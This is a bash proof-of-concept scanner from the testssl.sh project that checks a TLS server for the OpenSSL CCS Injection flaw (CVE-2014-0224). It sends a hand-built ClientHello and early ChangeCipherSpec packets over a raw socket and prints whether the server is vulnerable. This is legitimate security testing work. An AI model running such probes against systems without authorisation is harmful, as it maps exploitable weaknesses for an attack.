#!/bin/bash 

# POC bash socket implementation of CCS Injection vulnerability in OpenSSL (CVE-2014-0224), see https://www.openssl.org/news/secadv_20140605.txt
# Author: Dirk Wetter, GPLv2 see https://testssl.sh/LICENSE.txt 
#
# sockets inspired by http://blog.chris007.de/?p=238
# mainly adapted from the C code from https://gist.github.com/rcvalle/71f4b027d61a78c42607
# thx Ramon de C Valle
#
###### DON'T DO EVIL! USAGE AT YOUR OWN RISK. DON'T VIOLATE LAWS! #######

NODE=""
SLEEP=2
DEBUG=${DEBUG:-0}

[ -z "$1" ] && exit 1

# TLS 1.0=x01  1.1=0x02, 1.2=0x3
# the PoC contains per default only check for TLS1.0 as the is the least common denominator
TLSV=${2:-x01}

ccs_message="\x14\x03\tls_version\x00\x01\x01"
##                                                   ^^^^^^^ this is the thing!

client_hello="
# TLS header ( 5 bytes)
,x16,               # Content type (x16 for handshake)
x03, tls_version,   # TLS Version
x00, x93,           # Length
# Handshake header
x01,                # Type (x01 for ClientHello)
x00, x00, x8f,      # Length
x03, tls_version,   # TLS Version
# Random (32 byte) Unix time etc, see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
x53, x9c, xb2, xcb, x4b, 
x42, xf9, x2d, x0b, xe5, x9c, x21, xf5, xa3, x89, xca, x7a, xd9, xb4, xab, x3f,
xd3, x22, x21, x5e, xc4, x65, x0d, x1e, xce, xed, xc2,
x00,               # Session ID length
x00, x68,          # Cipher suites length
  xc0, x13,
  xc0, x12,
  xc0, x11,
  xc0, x10,
  xc0, x0f,
  xc0, x0e,
  xc0, x0d,
  xc0, x0c,
  xc0, x0b,
  xc0, x0a,
  xc0, x09,
  xc0, x08,
  xc0, x07,
  xc0, x06,
  xc0, x05,
  xc0, x04,
  xc0, x03,
  xc0, x02,
  xc0, x01,
  x00, x39,
  x00, x38,
  x00, x37,
  x00, x36,
  x00, x35,
  x00, x34,
  x00, x33,
  x00, x32,
  x00, x31,
  x00, x30,
  x00, x2f,
  x00, x16,
  x00, x15,
  x00, x14,
  x00, x13,
  x00, x12,
  x00, x11,
  x00, x10,
  x00, x0f,
  x00, x0e,
  x00, x0d,
  x00, x0c,
  x00, x0b,
  x00, x0a,
  x00, x09,
  x00, x08,
  x00, x07,
  x00, x06,
  x00, x05,
  x00, x04,
  x00, x03,
  x00, x02,
  x00, x01,
  x01, x00"

msg=`echo "$client_hello" | sed -e 's/# .*$//g' -e 's/,/\\\/g' | sed -e 's/ //g' | tr -d '\n'`


parse_hn_port() {
	PORT=443       # unless otherwise auto-determined, see below
	NODE="$1"

	# strip "https", supposed it was supplied additionally
	echo $NODE | grep -q 'https://' && NODE=`echo $NODE | sed -e 's/https\:\/\///' `

	# strip trailing urlpath
	NODE=`echo $NODE | sed -e 's/\/.*$//'`

	# determine port, supposed it was supplied additionally
	echo $NODE | grep -q ':' && PORT=`echo $NODE | sed 's/^.*\://'` && NODE=`echo $NODE | sed
	's/\:.*$//'`
}

socksend() {
	data=`echo $1 | sed 's/tls_version/'"$2"'/g'`
	echo "\"$data\""
	echo -en "$data" >&5 || return 1
	sleep $SLEEP
	return 0
}

sockread()
{
	reply=`dd bs=$1 count=1 <&5 2>/dev/null`
}

ok_ids(){
	echo
	tput bold; tput setaf 2; echo "ok -- something resetted our ccs packets"; tput sgr0
	echo
	exit 0
}


#### main

parse_hn_port "$1"

if ! exec 5<> /dev/tcp/$NODE/$PORT; then
	echo "`basename $0`: unable to connect to $NODE:$PORT"
	exit 2
fi
# socket is now open with fd 5


echo "##### sending client hello:"
socksend "$msg" $TLSV

sockread 5000
echo -e "\n##### server hello\c"
if test $DEBUG ; then
	echo ":"
	echo -e "$reply" | xxd -c32 | head -20
	echo "[...]"
	echo
fi

echo "##### sending ccs injection with TLS version $TLSV:"
socksend "$ccs_message" $TLSV || ok_ids
sleep 1
socksend "$ccs_message" $TLSV || ok_ids

sockread 65534
echo
echo "###### reply: "
echo -e "$reply" | xxd -c32
echo

reply_sanitized=`echo -e "$reply" | xxd -p | tr -cd '[:print:]' | sed 's/^..........//'`
test $DEBUG || echo $reply_sanitized 

lines=`echo -e "$reply" | xxd -c32 | wc -l`
test $DEBUG || echo $lines

if [ "$lines" -gt 1 ] || [ "$reply_sanitized" == "0a" ] ;then
	tput bold; tput setaf 2; echo "ok"; tput sgr0
	ret=0
else
	tput bold; tput setaf 1; echo "VULNERABLE"; tput sgr0
	ret=1
fi

echo
exit $ret


#  vim:tw=100:ts=5:sw=5
#  $Id: ccs-injection.sh,v 1.3 2014/06/14 21:44:42 dirkw Exp $ 
